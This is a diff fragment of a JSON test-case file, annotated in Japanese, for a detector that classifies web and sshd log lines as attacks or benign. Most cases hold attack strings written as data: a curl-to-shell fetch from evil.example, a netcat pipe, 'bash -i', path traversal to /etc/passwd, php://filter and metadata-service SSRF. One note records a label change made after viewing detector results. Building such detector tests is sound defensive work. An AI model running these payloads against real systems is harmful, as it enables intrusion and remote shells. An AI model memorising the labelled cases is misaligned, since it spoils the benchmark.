+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /tags?list=red;lsb-release HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "';ls'で始まる別単語"
+    },
+    {
+      "case_id": "cmd-benign-price-label:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "cmd-benign-price-label",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /pricing?currency=USD&label=$(monthly) HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "表示ラベルの$(...)"
+    },
+    {
+      "case_id": "bf-failed-login-lower:BRUTE_FORCE",
+      "rule_id": "BRUTE_FORCE",
+      "location": "bf-failed-login-lower",
+      "expected": "vulnerable",
+      "line": "auth: failed login for admin from 203.0.113.9",
+      "note": "ログイン失敗イベント(小文字)"
+    },
+    {
+      "case_id": "bf-failed-login-capital:BRUTE_FORCE",
+      "rule_id": "BRUTE_FORCE",
+      "location": "bf-failed-login-capital",
+      "expected": "vulnerable",
+      "line": "auth: Failed login for admin from 203.0.113.9",
+      "note": "同じイベントの大文字表記"
+    },
+    {
+      "case_id": "bf-benign-success:BRUTE_FORCE",
+      "rule_id": "BRUTE_FORCE",
+      "location": "bf-benign-success",
+      "expected": "not_vulnerable",
+      "line": "auth: login succeeded for admin from 203.0.113.9",
+      "note": "ログイン成功"
+    },
+    {
+      "case_id": "scanner-sqlmap-ua:SCANNER",
+      "rule_id": "SCANNER",
+      "location": "scanner-sqlmap-ua",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /item?id=1 HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.7.8#stable\"",
+      "note": "スキャナのUA"
+    },
+    {
+      "case_id": "scanner-benign-zapier:SCANNER",
+      "rule_id": "SCANNER",
+      "location": "scanner-benign-zapier",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /blog/zapier-integration-guide HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "記事slugにzapを含むだけ"
+    },
+    {
+      "case_id": "scanner-benign-nmap-doc:SCANNER",
+      "rule_id": "SCANNER",
+      "location": "scanner-benign-nmap-doc",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /downloads/nmap-cheatsheet.pdf HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "資料ダウンロード(スキャン自体ではない)"
+    },
+    {
+      "case_id": "sensitive-env:SENSITIVE_FILE_PROBE",
+      "rule_id": "SENSITIVE_FILE_PROBE",
+      "location": "sensitive-env",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /.env HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": ".envの探索"
+    },
+    {
+      "case_id": "sensitive-git-config:SENSITIVE_FILE_PROBE",
+      "rule_id": "SENSITIVE_FILE_PROBE",
+      "location": "sensitive-git-config",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /.git/config HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": ".git/configの探索"
+    },
+    {
+      "case_id": "sensitive-benign-envelope:SENSITIVE_FILE_PROBE",
+      "rule_id": "SENSITIVE_FILE_PROBE",
+      "location": "sensitive-benign-envelope",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /assets/js/jquery.envelope.js HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": ".envで始まる別単語"
+    },
+    {
+      "case_id": "cms-wp-login:CMS_PROBE",
+      "rule_id": "CMS_PROBE",
+      "location": "cms-wp-login",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /wp-login.php HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "WordPressログインの探索"
+    },
+    {
+      "case_id": "cms-benign-article:CMS_PROBE",
+      "rule_id": "CMS_PROBE",
+      "location": "cms-benign-article",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /blog/how-to-secure-wp-admin-panel HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "wp-adminの記事"
+    },
+    {
+      "case_id": "ssrf-metadata:SSRF",
+      "rule_id": "SSRF",
+      "location": "ssrf-metadata",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "メタデータサービス"
+    },
+    {
+      "case_id": "ssrf-urlencoded:SSRF",
+      "rule_id": "SSRF",
+      "location": "ssrf-urlencoded",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=http%3A%2F%2F169.254.169.254%2Flatest HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "エンコードされたメタデータ宛(攻撃)"
+    },
+    {
+      "case_id": "ssrf-benign-hostname-param:SSRF",
+      "rule_id": "SSRF",
+      "location": "ssrf-benign-hostname-param",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /health?target=localhost HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "スキームなしのhost名"
+    },
+    {
+      "case_id": "general-benign-page:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "general-benign-page:XSS",
+      "rule_id": "XSS",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "general-benign-page:LFI_RFI",
+      "rule_id": "LFI_RFI",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "general-benign-page:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "general-benign-page:BRUTE_FORCE",
+      "rule_id": "BRUTE_FORCE",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "general-benign-page:SCANNER",
+      "rule_id": "SCANNER",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "general-benign-page:PATH_TRAVERSAL",
+      "rule_id": "PATH_TRAVERSAL",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "general-benign-page:SENSITIVE_FILE_PROBE",
+      "rule_id": "SENSITIVE_FILE_PROBE",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "general-benign-page:CMS_PROBE",
+      "rule_id": "CMS_PROBE",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "general-benign-page:SSRF",
+      "rule_id": "SSRF",
+      "location": "general-benign-page",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "通常のページ取得は何にも該当しない"
+    },
+    {
+      "case_id": "lfi-double-encoded:LFI_RFI",
+      "rule_id": "LFI_RFI",
+      "location": "lfi-double-encoded",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /download?file=%252e%252e%252fetc%252fpasswd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "二重エンコードの../はLFI_RFIにも該当する(素の../の行と同じ扱いに揃えるラベル修正。検出器の結果を見た後に行った)"
+    },
+    {
+      "case_id": "heldout-sqli-union-all:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "heldout-sqli-union-all",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?id=1+UNION+ALL+SELECT+NULL,NULL HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: UNION ALL SELECT(攻撃)"
+    },
+    {
+      "case_id": "heldout-sqli-benign-union-word:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "heldout-sqli-benign-union-word",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /careers?team=union&role=select-staff HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: 通常のクエリ"
+    },
+    {
+      "case_id": "heldout-xss-img-onerror:XSS",
+      "rule_id": "XSS",
+      "location": "heldout-xss-img-onerror",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /s?q=<img src=x onerror=alert(1)> HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: imgのonerror"
+    },
+    {
+      "case_id": "heldout-xss-benign-js-path:XSS",
+      "rule_id": "XSS",
+      "location": "heldout-xss-benign-js-path",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /static/javascript/main.js HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: パスにjavascriptを含むだけ"
+    },
+    {
+      "case_id": "heldout-cmd-subshell-curl:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "heldout-cmd-subshell-curl",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?c=$(curl http://evil.example/x|sh) HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: $(curl ...)"
+    },
+    {
+      "case_id": "heldout-cmd-pipe-nc:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "heldout-cmd-pipe-nc",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?host=1.1.1.1|nc 203.0.113.9 4444 HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: パイプでnc(リバースシェル風)"
+    },
+    {
+      "case_id": "heldout-bf-sshd-failed-password:BRUTE_FORCE",
+      "rule_id": "BRUTE_FORCE",
+      "location": "heldout-bf-sshd-failed-password",
+      "expected": "vulnerable",
+      "line": "sshd[771]: Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2",
+      "note": "調整後に追加: 実際のsshdのログイン失敗"
+    },
+    {
+      "case_id": "heldout-ssrf-ipv6-loopback:SSRF",
+      "rule_id": "SSRF",
+      "location": "heldout-ssrf-ipv6-loopback",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=http://[::1]:8080/admin HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: IPv6ループバック宛"
+    },
+    {
+      "case_id": "heldout-ssrf-benign-https-public:SSRF",
+      "rule_id": "SSRF",
+      "location": "heldout-ssrf-benign-https-public",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=https://example.com/feed.xml HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: 公開サイト"
+    },
+    {
+      "case_id": "heldout-scanner-nikto-ua:SCANNER",
+      "rule_id": "SCANNER",
+      "location": "heldout-scanner-nikto-ua",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET / HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)\"",
+      "note": "調整後に追加: NiktoのUA"
+    },
+    {
+      "case_id": "heldout-scanner-benign-curl:SCANNER",
+      "rule_id": "SCANNER",
+      "location": "heldout-scanner-benign-curl",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /healthz HTTP/1.1\" 200 512 \"-\" \"curl/8.5.0\"",
+      "note": "調整後に追加: curlによる通常のヘルスチェック"
+    },
+    {
+      "case_id": "heldout-sensitive-htpasswd:SENSITIVE_FILE_PROBE",
+      "rule_id": "SENSITIVE_FILE_PROBE",
+      "location": "heldout-sensitive-htpasswd",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /admin/.htpasswd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: .htpasswd探索"
+    },
+    {
+      "case_id": "heldout-lfi-php-filter:LFI_RFI",
+      "rule_id": "LFI_RFI",
+      "location": "heldout-lfi-php-filter",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: php://filter"
+    },
+    {
+      "case_id": "heldout-cms-xmlrpc:CMS_PROBE",
+      "rule_id": "CMS_PROBE",
+      "location": "heldout-cms-xmlrpc",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"POST /xmlrpc.php HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "調整後に追加: xmlrpc.php"
+    },
+    {
+      "case_id": "heldout3-sqli-union-all-mixedcase:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "heldout3-sqli-union-all-mixedcase",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?id=1%20uNiOn%20aLl%20sElEcT%20NULL HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "defense-3の修正後に追加: 大小混在のUNION ALL SELECT"
+    },
+    {
+      "case_id": "heldout3-sqli-benign-union-word:SQL_INJECTION",
+      "rule_id": "SQL_INJECTION",
+      "location": "heldout3-sqli-benign-union-word",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /blog/european-union-all-members-select-committee HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "defense-3の修正後に追加: unionとselectを含む記事slug"
+    },
+    {
+      "case_id": "heldout3-cmd-pipe-bash:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "heldout3-cmd-pipe-bash",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /ping?ip=8.8.8.8|bash -i HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "defense-3の修正後に追加: パイプ+bash"
+    },
+    {
+      "case_id": "heldout3-cmd-benign-pipe:CMD_INJECTION",
+      "rule_id": "CMD_INJECTION",
+      "location": "heldout3-cmd-benign-pipe",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /search?tags=red|nc-cable HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "defense-3の修正後に追加: パイプ区切りの通常タグ"
+    },
+    {
+      "case_id": "heldout3-bf-sshd-root:BRUTE_FORCE",
+      "rule_id": "BRUTE_FORCE",
+      "location": "heldout3-bf-sshd-root",
+      "expected": "vulnerable",
+      "line": "sshd[802]: Failed password for root from 203.0.113.9 port 5151 ssh2",
+      "note": "defense-3の修正後に追加: sshd rootへの失敗"
+    },
+    {
+      "case_id": "heldout3-bf-benign-accepted:BRUTE_FORCE",
+      "rule_id": "BRUTE_FORCE",
+      "location": "heldout3-bf-benign-accepted",
+      "expected": "not_vulnerable",
+      "line": "sshd[803]: Accepted password for alice from 192.0.2.10 port 5152 ssh2",
+      "note": "defense-3の修正後に追加: 成功ログイン"
+    },
+    {
+      "case_id": "heldout3-ssrf-ipv6-long:SSRF",
+      "rule_id": "SSRF",
+      "location": "heldout3-ssrf-ipv6-long",
+      "expected": "vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=http://[0:0:0:0:0:0:0:1]/admin HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "defense-3の修正後に追加: IPv6ループバック完全表記"
+    },
+    {
+      "case_id": "heldout3-ssrf-benign-ipv6-public:SSRF",
+      "rule_id": "SSRF",
+      "location": "heldout3-ssrf-benign-ipv6-public",
+      "expected": "not_vulnerable",
+      "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=http://[2001:db8::1]/docs HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+      "note": "defense-3の修正後に追加: 公開IPv6(文書用アドレス)"
+    }
+  ]
 }
